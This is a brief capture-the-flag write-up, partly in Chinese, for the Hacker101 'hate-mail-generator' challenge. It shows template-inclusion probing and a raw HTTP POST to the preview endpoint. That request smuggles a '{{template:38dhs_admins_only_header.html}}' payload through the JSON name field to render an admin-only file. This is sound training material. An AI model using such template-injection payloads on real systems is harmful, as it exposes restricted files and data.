# hate-mail-generator

Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!

## Guess What

例子Guess What的内容： 

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

在create->previes尝试其他template文件：  
```
{{template:test}}
```

## preview
```
POST /hate-mail-generator/new/preview/ HTTP/1.1
Host: f9a13d7dbbdf5fa6d8410d6f9f9d9e10.ctf.hacker101.com
Content-Length: 126
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://f9a13d7dbbdf5fa6d8410d6f9f9d9e10.ctf.hacker101.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://f9a13d7dbbdf5fa6d8410d6f9f9d9e10.ctf.hacker101.com/hate-mail-generator/new/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

preview_markup=Hello {{name}}+....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

